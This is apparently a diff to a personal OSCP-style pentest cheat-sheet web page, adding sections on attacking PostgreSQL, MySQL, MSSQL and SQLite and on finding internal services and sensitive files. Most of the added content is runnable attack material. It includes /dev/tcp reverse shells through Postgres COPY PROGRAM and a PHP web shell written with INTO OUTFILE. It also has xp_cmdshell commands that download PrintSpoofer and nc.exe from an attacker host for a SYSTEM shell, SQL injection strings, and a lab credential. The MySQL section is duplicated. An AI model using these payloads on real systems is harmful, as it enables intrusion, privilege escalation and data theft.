@@ -131,24 +131,757 @@
         <h1>General</h1>
 
         <div class="section">
-            <div class="section-header">Postgres</div>
+            <div class="section-header">PostgreSQL</div>
             <div class="section-content">
 
-                <p><strong>If we have access to a postgres database</strong></p>
+                <h3>Initial Access</h3>
+
+                <p><strong>Connect to PostgreSQL database</strong></p>
                 <pre><code>psql -h &lt;IP&gt; -p &lt;Port&gt; -U &lt;User&gt;</code></pre>
 
-                <p><strong>Revershell</strong></p>
+                <p>If password is required:</p>
+                <pre><code>psql -h &lt;IP&gt; -p &lt;Port&gt; -U &lt;User&gt; -W</code></pre>
+
+                <h3>Basic Enumeration (VERY IMPORTANT)</h3>
+
+                <pre><code>
+\l          -- list databases
+\c dbname   -- connect to database
+\dt         -- list tables
+\d          -- describe table
+\du         -- list users/roles
+        </code></pre>
+
+                <p><strong>Useful SQL queries:</strong></p>
+
+                <pre><code>
+SELECT user;
+SELECT current_user;
+SELECT version();
+        </code></pre>
+
+                <h3>File Read (if permissions allow)</h3>
+
+                <pre><code>
+SELECT pg_read_file('/etc/passwd');
+        </code></pre>
+
+                <p><strong>Check if superuser:</strong></p>
+
+                <pre><code>
+SELECT usesuper FROM pg_user WHERE usename = current_user;
+        </code></pre>
+
+                <h3>RCE via COPY PROGRAM (Key technique)</h3>
+
+                <p>This works only if the PostgreSQL user has <strong>superuser or elevated privileges</strong>.</p>
+
+                <pre><code>
+COPY (SELECT '') TO PROGRAM 'id';
+        </code></pre>
+
+                <p><strong>Reverse shell (direct execution)</strong></p>
+
+                <pre><code>
+COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/&lt;ATTACKER_IP&gt;/&lt;PORT&gt; 0>&1"';
+        </code></pre>
+
+                <h3>Alternative Method (staged execution via file)</h3>
+
                 <pre><code>
 CREATE TABLE shell(output text);
 
-COPY shell FROM PROGRAM 'echo "sh -i >& /dev/tcp/&lt;AttackerIP&gt;/&lt;AttackerPort&gt; 0>&1" > /tmp/poo2.sh';
+COPY shell FROM PROGRAM 'echo "bash -i >& /dev/tcp/&lt;ATTACKER_IP&gt;/&lt;PORT&gt; 0>&1" > /tmp/shell.sh';
 
-COPY shell FROM PROGRAM '/bin/bash /tmp/poo2.sh';
-                </code></pre>
+COPY shell FROM PROGRAM 'bash /tmp/shell.sh';
+        </code></pre>
+
+                <h3>When it works</h3>
+
+                <ul>
+                    <li>Database user has SUPERUSER privileges OR dangerous roles enabled</li>
+                    <li><code>COPY ... PROGRAM</code> is not restricted by configuration</li>
+                    <li>Binary execution allowed by OS permissions</li>
+                </ul>
+
+                <h3>When it fails</h3>
+
+                <ul>
+                    <li>Role is unprivileged (most real systems)</li>
+                    <li>copy_program is disabled</li>
+                    <li>Restricted sandbox / managed DB environment</li>
+                </ul>
+
+                <h3>Common escalation path mindset</h3>
+
+                <pre><code>
+Postgres access → check roles → check file read → check COPY PROGRAM → RCE
+        </code></pre>
+
+                <h3>One-line rule</h3>
+
+                <pre><code>
+If Postgres user is superuser → COPY PROGRAM = instant RCE
+        </code></pre>
+
             </div>
         </div>
 
+        <div class="section">
+            <div class="section-header">MySQL → File Read / Write → RCE (Web Shell)</div>
+            <div class="section-content">
 
+                <h3>Connect to MySQL</h3>
+
+                <pre><code>
+mysql -u root -p -h 10.10.10.10
+        </code></pre>
+
+                <h3>Check user & privileges</h3>
+
+                <pre><code>
+SELECT user(), current_user();
+SHOW GRANTS;
+        </code></pre>
+
+                <p>
+                    Look for <b>FILE privilege</b> → required for LOAD_FILE / INTO OUTFILE.
+                </p>
+
+                <h3>Check FILE privilege explicitly</h3>
+
+                <pre><code>
+SHOW GRANTS FOR CURRENT_USER();
+        </code></pre>
+
+                <p>
+                    You need <b>FILE</b> privilege to read/write local files.
+                </p>
+
+                <h3>Read local files (LFI via DB)</h3>
+
+                <pre><code>
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
+        </code></pre>
+
+                <p>
+                    If NULL is returned → wrong path, permission issue, or secure_file_priv restriction.
+                </p>
+
+                <h3>Check secure_file_priv (IMPORTANT)</h3>
+
+                <pre><code>
+SHOW VARIABLES LIKE 'secure_file_priv';
+        </code></pre>
+
+                <p>
+                    Possible outcomes:<br>
+                    • Empty → no restriction (best case)<br>
+                    • /var/lib/mysql-files/ → must write inside that directory<br>
+                    • NULL → FILE operations disabled
+                </p>
+
+                <h3>Find web root (required for RCE)</h3>
+
+                <pre><code>
+# Common Linux web roots:
+ /var/www/html/
+ /var/www/
+ /srv/http/
+
+# Common Windows web roots:
+ C:\xampp\htdocs\
+ C:\inetpub\wwwroot\
+        </code></pre>
+
+                <h3>Write PHP web shell (RCE via web root)</h3>
+
+                <pre><code>
+SELECT '&lt;?php system($_GET["cmd"]); ?&gt;'
+INTO OUTFILE '/var/www/html/shell.php';
+        </code></pre>
+
+                <p>
+                    This creates a functional web shell because the SELECT statement contains PHP code.
+                </p>
+
+                <p>
+                    Requirements:<br>
+                    • FILE privilege enabled<br>
+                    • secure_file_priv allows target path<br>
+                    • Web server executes PHP in that directory
+                </p>
+
+                <h3>Alternative web shell (more stable)</h3>
+
+                <pre><code>
+SELECT '&lt;?php system($_GET["cmd"]); ?&gt;'
+INTO OUTFILE '/var/www/html/shell.php';
+        </code></pre>
+
+                <h3>Windows alternative web shell path</h3>
+
+                <pre><code>
+SELECT '<?php system($_GET["cmd"]); ?>'
+INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';
+        </code></pre>
+
+                <h3>Verify file creation</h3>
+
+                <pre><code>
+SELECT LOAD_FILE('/var/www/html/shell.php');
+        </code></pre>
+
+                <h3>Trigger RCE</h3>
+
+                <pre><code>
+http://TARGET/shell.php?cmd=id
+http://TARGET/shell.php?cmd=whoami
+        </code></pre>
+
+                <h3>Upgrade to reverse shell</h3>
+
+                <pre><code>
+php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+        </code></pre>
+
+                <h3>Listener (attacker machine)</h3>
+
+                <pre><code>
+rlwrap nc -nlvp 4444
+        </code></pre>
+
+                <h3>UDF privilege check (advanced escalation path)</h3>
+
+                <pre><code>
+SELECT * FROM mysql.user;
+SHOW VARIABLES LIKE 'plugin_dir';
+        </code></pre>
+
+                <p>
+                    If <b>plugin_dir is writable</b> + high privileges → possible UDF exploitation (lib_mysqludf_sys) →
+                    SYSTEM/root.
+                </p>
+
+                <h3>Common failure reasons (OSCP critical)</h3>
+
+                <pre><code>
+- secure_file_priv restricts write path
+- missing FILE privilege
+- wrong web root
+- PHP not executed in target directory
+- SELinux / AppArmor blocking writes
+        </code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">MSSQL → RCE → SYSTEM (xp_cmdshell + PrintSpoofer)</div>
+            <div class="section-content">
+
+                <h3>Connect to MSSQL</h3>
+
+                <pre><code>
+impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.85.148 -windows-auth
+        </code></pre>
+
+                <h3>Enable xp_cmdshell (RCE)</h3>
+
+                <pre><code>
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+        </code></pre>
+
+                <h3>Test command execution</h3>
+
+                <pre><code>
+EXEC xp_cmdshell 'whoami /priv';
+        </code></pre>
+
+                <h3>Check privileges (important for privesc)</h3>
+
+                <pre><code>
+EXEC xp_cmdshell 'whoami /priv';
+        </code></pre>
+
+                <h3>Start HTTP server (attacker machine)</h3>
+
+                <pre><code>
+python3 -m http.server 9998 --bind 127.0.0.1
+        </code></pre>
+
+                <h3>Ligolo port forwarding</h3>
+
+                <pre><code>
+listener_add --addr 0.0.0.0:9998 --to 127.0.0.1:9998
+        </code></pre>
+
+                <h3>Download payload (PrintSpoofer)</h3>
+
+                <pre><code>
+EXEC xp_cmdshell 'powershell -c "curl.exe http://10.10.85.147:9998/PrintSpoofer64.exe -o C:\Users\Public\PrintSpoofer64.exe"';
+        </code></pre>
+
+                <h3>Verify file upload</h3>
+
+                <pre><code>
+EXEC xp_cmdshell 'dir C:\Users\Public';
+        </code></pre>
+
+                <h3>Download reverse shell (nc.exe)</h3>
+
+                <pre><code>
+EXEC xp_cmdshell 'powershell -c "curl.exe http://10.10.85.147:9998/nc.exe -o C:\Users\Public\nc.exe"';
+        </code></pre>
+
+                <h3>Start listener</h3>
+
+                <pre><code>
+rlwrap nc -nlvp 9998
+        </code></pre>
+
+                <h3>Execute PrintSpoofer → SYSTEM shell</h3>
+
+                <pre><code>
+EXEC xp_cmdshell 'C:\Users\Public\PrintSpoofer64.exe -c "C:\Users\Public\nc.exe 10.10.85.147 9998 -e powershell"';
+        </code></pre>
+
+                <h3>Check privilege escalation</h3>
+
+                <pre><code>
+whoami
+# nt authority\system
+        </code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+
+    <div class="section-header">MySQL → File Read / Write → RCE (Web Shell)</div>
+    <div class="section-content">
+
+        <h3>Connect to MySQL</h3>
+
+        <pre><code>
+mysql -u root -p -h 10.10.10.10
+        </code></pre>
+
+        <h3>Check user & privileges</h3>
+
+        <pre><code>
+SELECT user(), current_user();
+SHOW GRANTS;
+        </code></pre>
+
+        <p>
+            Look for <b>FILE privilege</b> → required for LOAD_FILE / INTO OUTFILE.
+        </p>
+
+        <h3>Check FILE privilege explicitly</h3>
+
+        <pre><code>
+SHOW GRANTS FOR CURRENT_USER();
+        </code></pre>
+
+        <h3>Read local files</h3>
+
+        <pre><code>
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
+        </code></pre>
+
+        <p>
+            If NULL → wrong path, permission issue, or secure_file_priv restriction.
+        </p>
+
+        <h3>Check secure_file_priv</h3>
+
+        <pre><code>
+SHOW VARIABLES LIKE 'secure_file_priv';
+        </code></pre>
+
+        <h3>Find web root</h3>
+
+        <pre><code>
+/var/www/html/
+/var/www/
+/srv/http/
+
+C:\xampp\htdocs\
+C:\inetpub\wwwroot\
+        </code></pre>
+
+        <h3>Write PHP web shell (RCE)</h3>
+
+        <pre><code>
+SELECT '&lt;?php system($_GET["cmd"]); ?&gt;'
+INTO OUTFILE '/var/www/html/shell.php';
+        </code></pre>
+
+        <h3>Trigger RCE</h3>
+
+        <pre><code>
+http://TARGET/shell.php?cmd=id
+http://TARGET/shell.php?cmd=whoami
+        </code></pre>
+
+        <h3>Reverse shell</h3>
+
+        <pre><code>
+php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+        </code></pre>
+
+        <h3>Listener</h3>
+
+        <pre><code>
+rlwrap nc -nlvp 4444
+        </code></pre>
+
+        <h3>Common failure reasons</h3>
+
+        <pre><code>
+- secure_file_priv restriction
+- missing FILE privilege
+- wrong web root
+- PHP not executed
+- OS protections (SELinux/AppArmor)
+        </code></pre>
+
+    </div>
+</div>
+
+
+<div class="section">
+
+    <div class="section-header">SQLite → File Access → Injection → Dump → Pivoting</div>
+    <div class="section-content">
+
+        <h3>Connect to SQLite</h3>
+
+        <pre><code>
+sqlite3 /path/to/database.db
+        </code></pre>
+
+        <h3>List tables</h3>
+
+        <pre><code>
+.tables
+.schema
+        </code></pre>
+
+        <h3>Inspect data</h3>
+
+        <pre><code>
+SELECT * FROM users;
+SELECT * FROM sqlite_master;
+        </code></pre>
+
+        <h3>Check version</h3>
+
+        <pre><code>
+SELECT sqlite_version();
+        </code></pre>
+
+        <h3>Key limitation</h3>
+
+        <p>
+            No users, no privileges, no FILE privilege system.
+        </p>
+
+        <h3>SQL Injection examples</h3>
+
+        <pre><code>
+' OR 1=1 --
+' UNION SELECT NULL --
+        </code></pre>
+
+        <h3>Dump entire database</h3>
+
+        <pre><code>
+.dump
+        </code></pre>
+
+        <p>
+            Very important in OSCP:
+            <br>• Extract credentials
+            <br>• Offline analysis
+            <br>• Rebuild DB locally
+        </p>
+
+        <h3>Dump specific table</h3>
+
+        <pre><code>
+.dump users
+        </code></pre>
+
+        <h3>Export to file</h3>
+
+        <pre><code>
+sqlite3 database.db .dump > backup.sql
+        </code></pre>
+
+        <h3>CSV export alternative</h3>
+
+        <pre><code>
+.headers on
+.mode csv
+.output users.csv
+SELECT * FROM users;
+.output stdout
+        </code></pre>
+
+        <h3>Extension loading check</h3>
+
+        <pre><code>
+PRAGMA compile_options;
+        </code></pre>
+
+        <p>
+            Look for ENABLE_LOAD_EXTENSION → potential RCE vector.
+        </p>
+
+        <h3>Load extension (if enabled)</h3>
+
+        <pre><code>
+SELECT load_extension('/path/to/extension.so');
+        </code></pre>
+
+        <h3>OSCP reality</h3>
+
+        <p>
+            SQLite rarely gives direct RCE. Typical paths:
+        </p>
+
+        <p>
+            • SQLi → credential theft → SSH<br>
+            • SQLi → config leak → secrets<br>
+            • App logic abuse → command injection elsewhere<br>
+            • Rare: extension-based RCE
+        </p>
+
+        <h3>Common failure reasons</h3>
+
+        <pre><code>
+- No filesystem access
+- No extension loading
+- Strict sandboxing in web app
+- Limited SQL injection context
+        </code></pre>
+
+    </div>
+</div>
+
+        <div class="section">
+            <div class="section-header">Detecting Internal Services & Port Forwarding Decision Flow</div>
+            <div class="section-content">
+
+                <h3>Concept</h3>
+
+                <p>
+                    Internal services are applications running on the target machine that are bound to <strong>localhost
+                        (127.0.0.1)</strong>
+                    or private network interfaces. These services are not directly accessible from the attacker machine
+                    and require
+                    tunneling (port forwarding) or pivoting to interact with them.
+                </p>
+
+                <h3>How to Identify Internal Services</h3>
+
+                <p><strong>1. Check listening ports</strong></p>
+
+                <pre><code>
+ss -tulnp
+netstat -tulnp
+</code></pre>
+
+                <p><strong>Look for bindings like:</strong></p>
+
+                <pre><code>
+127.0.0.1:8080
+127.0.0.1:3000
+127.0.0.1:5432
+</code></pre>
+
+                <p>
+                    If a service is bound to <code>127.0.0.1</code>, it is only accessible locally from the target
+                    machine.
+                </p>
+
+                <h3>2. Identify running processes</h3>
+
+                <pre><code>
+ps aux
+</code></pre>
+
+                <p><strong>Look for suspicious or interesting services:</strong></p>
+
+                <ul>
+                    <li>python / flask / django apps</li>
+                    <li>node / express servers</li>
+                    <li>java jar applications</li>
+                    <li>databases (postgres, redis, mysql)</li>
+                </ul>
+
+                <h3>3. Check service configurations</h3>
+
+                <pre><code>
+cat /etc/nginx/sites-enabled/*
+cat /etc/apache2/ports.conf
+</code></pre>
+
+                <p><strong>Danger signs:</strong></p>
+
+                <pre><code>
+listen 127.0.0.1:8080;
+</code></pre>
+
+                <p>
+                    This means the web service is explicitly restricted to localhost.
+                </p>
+
+                <h3>4. Check local web access</h3>
+
+                <pre><code>
+curl http://127.0.0.1:8080
+curl http://localhost:3000
+</code></pre>
+
+                <p>
+                    If this works locally but not externally, the service is internal-only.
+                </p>
+
+                <h3>5. Check network interfaces</h3>
+
+                <pre><code>
+ip a
+ip route
+</code></pre>
+
+                <p><strong>Look for internal networks like:</strong></p>
+
+                <pre><code>
+10.10.10.0/24
+172.16.0.0/16
+192.168.0.0/24
+</code></pre>
+
+                <h3>Decision: When to use Port Forwarding</h3>
+
+                <ul>
+                    <li>Service is bound to <code>127.0.0.1</code></li>
+                    <li>Service is only reachable from <code>curl localhost</code></li>
+                    <li>Service does not appear in external nmap scan</li>
+                    <li>You find internal-only web panels or APIs</li>
+                </ul>
+
+                <h3>Port Forwarding Example (SSH -L)</h3>
+
+                <pre><code>
+ssh -L 8080:127.0.0.1:8080 user@target
+</code></pre>
+
+                <p><strong>Then access locally:</strong></p>
+
+                <pre><code>
+http://127.0.0.1:8080
+</code></pre>
+
+                <h3>Mental Model</h3>
+
+                <pre><code>
+If service is on 127.0.0.1 → it exists, but is hidden from the outside world
+Port forwarding = bringing it to your machine
+</code></pre>
+
+                <h3>Common Real Targets</h3>
+
+                <ul>
+                    <li>Admin dashboards (localhost only)</li>
+                    <li>Databases (PostgreSQL, MySQL, Redis)</li>
+                    <li>Internal APIs</li>
+                    <li>Development servers (Flask / Node debug panels)</li>
+                </ul>
+
+                <h3>OSCP Rule</h3>
+
+                <pre><code>
+If service is reachable only via localhost → treat it as a high-value pivot target
+</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+    <div class="section-header">File Hunting → Búsqueda de Ficheros (Linux y Windows)</div>
+    <div class="section-content">
+
+        <h3>Buscar archivos en Linux</h3>
+        
+        <pre><code>
+# Buscar por nombre exacto
+find / -type f -name "flag.txt" 2>/dev/null
+
+# Buscar sin distinción de mayúsculas/minúsculas
+find / -type f -iname "password"
+
+# Buscar archivos de configuración
+find / -type f -iname "*.conf"
+
+# Buscar dentro de archivos (contenido)
+grep -R "password" /etc 2>/dev/null
+
+# Buscar archivos recientes (últimas 24h)
+find / -type f -mtime -1 2>/dev/null
+        </code></pre>
+
+        <h3>Buscar archivos en Windows</h3>
+        
+        <pre><code>
+# Buscar archivos por nombre (CMD)
+dir C:\ /s /b | findstr "password"
+
+# Buscar archivos por nombre (PowerShell - RECOMENDADO)
+Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue -Filter "*password*"
+
+# Buscar archivos con extensión específica
+dir C:\ /s /b | findstr ".config"
+
+# Buscar contenido dentro de archivos
+Select-String -Path C:\* -Pattern "password" -Recurse -ErrorAction SilentlyContinue
+
+# Buscar web roots (muy común en OSCP)
+dir C:\inetpub\wwwroot\ /s
+
+# Unattended install files (muy importante)
+dir C:\Windows\Panther\ /s
+        </code></pre>
+
+        <h3>Archivos sensibles comunes (OSCP)</h3>
+        <p>
+            • Archivos de configuración (config, .ini, .conf)<br>
+            • Web config (web.config en IIS)<br>
+            • Backups (.bak, .old, .zip)<br>
+            • Unattended install files (Unattend.xml)<br>
+            • Claves SSH (id_rsa, private keys)<br>
+            • Variables de entorno (.env)
+        </p>
+
+        <h3>Errores comunes en file hunting</h3>
+        <pre><code>
+- No usar PowerShell cuando está disponible (mejor que CMD)
+- No filtrar correctamente (demasiado ruido)
+- Ignorar directorios de usuarios (C:\Users\)
+- Ignorar directorios temporales (C:\Users\Public, C:\Temp, /tmp)
+        </code></pre>
+
+    </div>
+</div>
 
     </div>
     <!-- SCRIPT -->
@@ -217,37 +950,37 @@ COPY shell FROM PROGRAM '/bin/bash /tmp/poo2.sh';
             resultsContainer.classList.remove("collapsed");
         }
         document.querySelectorAll(".sub-title").forEach(title => {
-                        const wrapper = document.createElement("div");
-                        wrapper.classList.add("sub-wrapper");
+            const wrapper = document.createElement("div");
+            wrapper.classList.add("sub-wrapper");
 
-                        const content = document.createElement("div");
-                        content.classList.add("sub-content");
+            const content = document.createElement("div");
+            content.classList.add("sub-content");
 
-                        // meter wrapper en el DOM justo antes del título
-                        title.parentNode.insertBefore(wrapper, title);
+            // meter wrapper en el DOM justo antes del título
+            title.parentNode.insertBefore(wrapper, title);
 
-                        // mover el título dentro del wrapper
-                        wrapper.appendChild(title);
+            // mover el título dentro del wrapper
+            wrapper.appendChild(title);
 
-                        // mover todo hasta el siguiente sub-title o section-header
-                        let next = wrapper.nextSibling;
+            // mover todo hasta el siguiente sub-title o section-header
+            let next = wrapper.nextSibling;
 
-                        while (
-                                next &&
-                                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
-                        ) {
-                                const temp = next.nextSibling;
-                                content.appendChild(next);
-                                next = temp;
-                        }
+            while (
+                next &&
+                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
+            ) {
+                const temp = next.nextSibling;
+                content.appendChild(next);
+                next = temp;
+            }
 
-                        wrapper.appendChild(content);
+            wrapper.appendChild(content);
 
-                        // toggle
-                        title.addEventListener("click", () => {
-                                wrapper.classList.toggle("active");
-                        });
-                });
+            // toggle
+            title.addEventListener("click", () => {
+                wrapper.classList.toggle("active");
+            });
+        });
     </script>
 
 </body>
